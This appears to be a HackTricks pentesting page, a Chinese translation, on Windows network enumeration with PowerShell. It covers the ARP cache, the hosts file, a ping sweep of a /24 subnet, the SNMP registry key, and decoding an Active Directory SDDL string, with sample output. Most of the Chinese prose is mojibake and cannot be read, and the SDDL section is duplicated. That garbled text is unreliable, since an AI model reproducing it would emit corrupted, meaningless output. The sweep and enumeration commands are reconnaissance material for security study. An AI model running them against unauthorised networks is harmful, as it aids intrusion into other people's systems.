ARPç¼“å­˜ä¸­å­˜å‚¨äº†IPåœ°å€å’Œå¯¹åº”çš„MACåœ°å€çš„æ˜ å°„å…³ç³»ã€‚å½“ä¸€ä¸ªè®¾å¤‡éœ€è¦å‘é€æ•°æ®åŒ…åˆ°å¦ä¸€ä¸ªè®¾å¤‡æ—¶ï¼Œå®ƒé¦–å…ˆæ£€æŸ¥è‡ªå·±çš„ARPç¼“å­˜ã€‚å¦‚æœç¼“å­˜ä¸­æ²¡æœ‰ç›®æ ‡è®¾å¤‡çš„MACåœ°å€ï¼Œé‚£ä¹ˆè®¾å¤‡å°†å‘é€ä¸€ä¸ªARPè¯·æ±‚å¹¿æ’­ï¼Œè¯¢é—®å±€åŸŸç½‘ä¸­çš„å…¶ä»–è®¾å¤‡ï¼Œä»¥è·å–ç›®æ ‡è®¾å¤‡çš„MACåœ°å€ã€‚

ARPæ¬ºéª—æ˜¯ä¸€ç§åˆ©ç”¨ARPåè®®çš„æ¼æ´è¿›è¡Œæ”»å‡»çš„æŠ€æœ¯ã€‚æ”»å‡»è€…å¯ä»¥å‘é€è™šå‡çš„ARPå“åº”ï¼Œæ¬ºéª—å…¶ä»–è®¾å¤‡å°†æ•°æ®åŒ…å‘é€åˆ°æ”»å‡»è€…æ§åˆ¶çš„è®¾å¤‡ä¸Šã€‚è¿™ç§æ”»å‡»å¯ä»¥ç”¨äºä¸­é—´äººæ”»å‡»ã€ç½‘ç»œå—…æ¢å’Œä¼šè¯åŠ«æŒç­‰æ¶æ„æ´»åŠ¨ã€‚

ä¸ºäº†é˜²æ­¢ARPæ¬ºéª—æ”»å‡»ï¼Œå¯ä»¥é‡‡å–ä¸€äº›åŸºæœ¬çš„é˜²å¾¡æªæ–½ï¼Œå¦‚ä½¿ç”¨é™æ€ARPæ¡ç›®ã€å¯ç”¨ARPæ£€æµ‹å’Œé˜²å¾¡å·¥å…·ï¼Œä»¥åŠå®šæœŸæ¸…é™¤ARPç¼“å­˜ã€‚è¿™äº›æªæ–½å¯ä»¥å¸®åŠ©ä¿æŠ¤ç½‘ç»œå…å—ARPæ¬ºéª—æ”»å‡»çš„å½±å“ã€‚
```powershell
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```
### ä¸»æœº

The `hosts` file is a plain text file used by operating systems to map hostnames to IP addresses. It is commonly used to block or redirect certain websites or to override DNS settings. In Windows, the `hosts` file is located at `C:\Windows\System32\drivers\etc\hosts`.

`hosts`æ–‡ä»¶æ˜¯æ“ä½œç³»ç»Ÿç”¨æ¥å°†ä¸»æœºåæ˜ å°„åˆ°IPåœ°å€çš„çº¯æ–‡æœ¬æ–‡ä»¶ã€‚å®ƒé€šå¸¸ç”¨äºé˜»æ­¢æˆ–é‡å®šå‘ç‰¹å®šçš„ç½‘ç«™ï¼Œæˆ–è€…ç”¨äºè¦†ç›–DNSè®¾ç½®ã€‚åœ¨Windowsä¸­ï¼Œ`hosts`æ–‡ä»¶ä½äº`C:\Windows\System32\drivers\etc\hosts`ã€‚
```powershell
Get-Content C:\WINDOWS\System32\drivers\etc\hosts
```
### Ping

Pingæ˜¯ä¸€ç§ç”¨äºæµ‹è¯•ç½‘ç»œè¿æ¥çš„å¸¸ç”¨å·¥å…·ã€‚å®ƒé€šè¿‡å‘ç›®æ ‡ä¸»æœºå‘é€ICMP Echoè¯·æ±‚å¹¶ç­‰å¾…å“åº”æ¥æ£€æŸ¥ä¸»æœºçš„å¯è¾¾æ€§å’Œå“åº”æ—¶é—´ã€‚Pingå‘½ä»¤é€šå¸¸ç”¨äºè¯Šæ–­ç½‘ç»œé—®é¢˜å’Œæµ‹é‡ç½‘ç»œå»¶è¿Ÿã€‚

ä½¿ç”¨Pingå‘½ä»¤éå¸¸ç®€å•ã€‚åªéœ€åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥`ping`ï¼Œåè·Ÿç›®æ ‡ä¸»æœºçš„IPåœ°å€æˆ–åŸŸåã€‚ä¾‹å¦‚ï¼š

```
ping 192.168.0.1
```

Pingå‘½ä»¤å°†å‘é€ä¸€ç³»åˆ—çš„ICMP Echoè¯·æ±‚ï¼Œå¹¶æ˜¾ç¤ºæ¯ä¸ªè¯·æ±‚çš„å“åº”æ—¶é—´ã€‚å®ƒè¿˜æä¾›æœ‰å…³ä¸¢åŒ…ç‡å’Œå¾€è¿”æ—¶é—´çš„ç»Ÿè®¡ä¿¡æ¯ã€‚

Pingå‘½ä»¤è¿˜æ”¯æŒä¸€äº›å¯é€‰å‚æ•°ï¼Œä¾‹å¦‚ï¼š

- `-t`ï¼šæŒç»­å‘é€ICMP Echoè¯·æ±‚ï¼Œç›´åˆ°æ‰‹åŠ¨åœæ­¢ã€‚
- `-n`ï¼šæŒ‡å®šè¦å‘é€çš„ICMP Echoè¯·æ±‚çš„æ•°é‡ã€‚
- `-l`ï¼šæŒ‡å®šè¦å‘é€çš„ICMP Echoè¯·æ±‚çš„æ•°æ®åŒ…å¤§å°ã€‚

Pingå‘½ä»¤å¯¹äºç¡®å®šç½‘ç»œè¿æ¥æ˜¯å¦æ­£å¸¸ä»¥åŠè¯Šæ–­ç½‘ç»œé—®é¢˜éå¸¸æœ‰ç”¨ã€‚å®ƒè¿˜å¯ä»¥ç”¨äºæµ‹è¯•ä¸»æœºçš„å“åº”æ—¶é—´ï¼Œä»¥è¯„ä¼°ç½‘ç»œæ€§èƒ½ã€‚
```powershell
$ping = New-Object System.Net.Networkinformation.Ping
1..254 | % { $ping.send("10.9.15.$_") | select address, status }
```
### SNMP

SNMPï¼ˆSimple Network Management Protocolï¼‰æ˜¯ä¸€ç§ç”¨äºç®¡ç†å’Œç›‘æ§ç½‘ç»œè®¾å¤‡çš„åè®®ã€‚å®ƒå…è®¸ç®¡ç†å‘˜é€šè¿‡å‘é€å’Œæ¥æ”¶æ¶ˆæ¯æ¥è·å–æœ‰å…³è®¾å¤‡çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ç³»ç»ŸçŠ¶æ€ã€ç½‘ç»œæµé‡å’Œé”™è¯¯æŠ¥å‘Šã€‚SNMPä½¿ç”¨åŸºäºUDPçš„ä¼ è¾“åè®®ï¼Œå¹¶ä½¿ç”¨MIBï¼ˆManagement Information Baseï¼‰æ¥å®šä¹‰è®¾å¤‡ä¸Šå¯ç”¨çš„ä¿¡æ¯ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨SNMPåè®®æ¥æ”¶é›†æœ‰å…³ç›®æ ‡ç½‘ç»œè®¾å¤‡çš„ä¿¡æ¯ï¼Œä¾‹å¦‚æ“ä½œç³»ç»Ÿç‰ˆæœ¬ã€å¼€æ”¾çš„ç«¯å£å’Œé…ç½®è®¾ç½®ã€‚è¿™äº›ä¿¡æ¯å¯ä»¥å¸®åŠ©æ”»å‡»è€…è¯†åˆ«æ½œåœ¨çš„æ¼æ´å’Œæ”»å‡»è·¯å¾„ã€‚
```powershell
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```
## **å°†SDDLå­—ç¬¦ä¸²è½¬æ¢ä¸ºå¯è¯»æ ¼å¼**

To convert the SDDL (Security Descriptor Definition Language) string into a readable format, you can use the `ConvertFrom-SddlString` cmdlet in PowerShell. This cmdlet allows you to convert the SDDL string into an object that can be easily understood.

```powershell
$sddlString = "SDDL_STRING_HERE"
$securityDescriptor = ConvertFrom-SddlString -Sddl $sddlString
$securityDescriptor
```

Replace `SDDL_STRING_HERE` with the actual SDDL string you want to convert. After running the above code, the PowerShell console will display the converted security descriptor object, which provides a more human-readable representation of the SDDL string.

## **å°†SDDLå­—ç¬¦ä¸²è½¬æ¢ä¸ºå¯è¯»æ ¼å¼**

è¦å°†SDDLï¼ˆå®‰å…¨æè¿°ç¬¦å®šä¹‰è¯­è¨€ï¼‰å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¯è¯»æ ¼å¼ï¼Œå¯ä»¥ä½¿ç”¨PowerShellä¸­çš„`ConvertFrom-SddlString` cmdletã€‚è¯¥cmdletå…è®¸æ‚¨å°†SDDLå­—ç¬¦ä¸²è½¬æ¢ä¸ºæ˜“äºç†è§£çš„å¯¹è±¡ã€‚

```powershell
$sddlString = "SDDL_STRING_HERE"
$securityDescriptor = ConvertFrom-SddlString -Sddl $sddlString
$securityDescriptor
```

å°†`SDDL_STRING_HERE`æ›¿æ¢ä¸ºè¦è½¬æ¢çš„å®é™…SDDLå­—ç¬¦ä¸²ã€‚è¿è¡Œä¸Šè¿°ä»£ç åï¼ŒPowerShellæ§åˆ¶å°å°†æ˜¾ç¤ºè½¬æ¢åçš„å®‰å…¨æè¿°ç¬¦å¯¹è±¡ï¼Œè¯¥å¯¹è±¡æä¾›äº†SDDLå­—ç¬¦ä¸²çš„æ›´æ˜“è¯»çš„è¡¨ç¤ºå½¢å¼ã€‚
```powershell

PS C:\> ConvertFrom-SddlString "O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CR;00299570-246d-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-3842939050-3880317879-2865463114-522)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-498)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;CI;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CC;4828cc14-1437-45bc-9b07-ad6f015e5f28;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a86-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a9c-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aa5-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aba-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;5cb41ed0-0e4c-11d0-a286-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;RP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-3842939050-3880317879-2865463114-5181)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;9a7ad945-ca53-11d1-bbd0-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967991-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a0a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;9a9a021e-4a5b-11d1-a9c3-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;0296c120-40da-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;934de926-b09e-11d2-aa06-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5e353847-f36c-48be-a7f7-49685402503c;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;8d3bca50-1d7e-11d0-a081-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;e48d0154-bcf8-11d1-8702-00c04fb96050;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;275b2f54-982d-4dcd-b0ad-e53501445efb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5fd42471-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5430e777-c3ea-4024-902e-dde192204669;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;6f606079-3a82-4c1b-8efb-dcc8c91d26fe;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a7a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;614aea82-abc6-4dd0-a148-d67a59c72816;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;66437984-c3c5-498f-b269-987819ef484b;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;2cc06e9d-6f7e-426a-8825-0215de176e11;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;3263e3b8-fd6b-4c60-87f2-34bdaa9d69eb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf9679c0-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e0abfd0-126a-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;7cb4c7d3-8787-42b0-b438-3c5d479ad31e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-526)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-527)(OA;CI;DTWD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;DTWD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CCDCLCRPWPLO;f0f8ffac-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;CCDCLCRPWPLO;e8b2aff2-59a7-4eac-9a70-819adef701dd;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aa5-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;5cb41ed0-0e4c-11d0-a286-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;WD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;c975c901-6cea-4b6f-8319-d67f45449506;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;f0f8ffac-1191-11d0-a060-00aa006c33ed;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CINPIO;RPWPLOSD;;e8b2aff2-59a7-4eac-9a70-819adef701dd;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;NS)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;AU)(OA;CI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;LCSWRPWPRC;;;S-1-5-21-3842939050-3880317879-2865463114-5213)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5172)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5187)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3842939050-3880317879-2865463114-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;CI;LCRPWPRC;;;AN)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)"
Owner            : BUILTIN\Administrators
Group            : BUILTIN\Administrators
DiscretionaryAcl : {Everyone: AccessDenied (WriteData), Everyone: AccessAllowed (WriteExtendedAttributes), NT
AUTHORITY\ANONYMOUS LOGON: AccessAllowed (CreateDirectories, GenericExecute, ReadPermissions,
Traverse, WriteExtendedAttributes), NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS: AccessAllowed
(CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions,
WriteExtendedAttributes)...}
SystemAcl        : {Everyone: SystemAudit SuccessfulAccess (ChangePermissions, TakeOwnership, Traverse),
BUILTIN\Administrators: SystemAudit SuccessfulAccess (WriteAttributes), DOMAIN_NAME\Domain Users:
SystemAudit SuccessfulAccess (WriteAttributes), Everyone: SystemAudit SuccessfulAccess
(Traverse)...}
RawDescriptor    : System.Security.AccessControl.CommonSecurityDescriptor
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶ **ç½‘ç»œå®‰å…¨å…¬å¸** å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°ä½ çš„ **å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾— **PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF** å—ï¼Ÿè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆ - [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾— [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…åœ¨ **Twitter** ä¸Š **å…³æ³¨** æˆ‘ [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘** [**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
